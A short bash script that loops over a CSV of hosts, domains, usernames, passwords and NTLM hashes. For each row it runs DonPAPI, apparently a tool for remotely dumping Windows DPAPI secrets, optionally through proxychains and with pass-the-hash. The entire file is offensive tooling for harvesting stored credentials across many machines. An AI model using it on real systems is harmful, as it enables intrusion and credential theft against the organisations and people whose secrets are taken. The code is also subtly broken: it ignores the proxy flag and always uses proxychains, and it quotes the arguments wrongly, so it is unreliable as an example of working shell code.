#!/bin/bash

if [ $# -ne 1 ]; then
    echo "Usage: $0 <file>"
    exit 1
fi

# ip,domain,username,password,ntlm,useProxy
while IFS=, read -r ip domain username password ntlm useProxy || [ -n "$ip" ]; do

    
    if [ "$domain" == "." ] || [ "$domain" == "" ]; then
        user="$username"
    else
        user="$domain/$username"
    fi

    if [ -n "$ntlm" ]; then
        param="$user@$ip -H $ntlm"
    else
        param="$user:$password@$ip"
    fi

    command="DonPAPI $param"
    if [ "$useProxy" == "true" ]; then
        command="proxychains -q DonPAPI $param"
    fi


    echo "Executing: $command"
    #$command
    proxychains -q DonPAPI "$param"
done < "$1"
